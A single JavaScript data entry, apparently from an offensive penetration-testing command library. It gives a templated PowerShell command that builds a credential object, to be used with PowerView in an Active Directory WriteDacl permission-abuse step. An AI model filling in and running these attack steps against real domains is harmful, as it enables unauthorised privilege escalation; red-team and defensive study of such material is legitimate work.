Object.assign(n[7259],{"tool":"powershell","v":"win","run":"$pass = ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('{{dc_netbios}}\\{{user}}', $pass)","note":"Build a credential object for the NEW user — the ACL edit must be performed as the account holding WriteDacl (upload PowerView.ps1 and dot-source it first: . .\\PowerView.ps1)."});
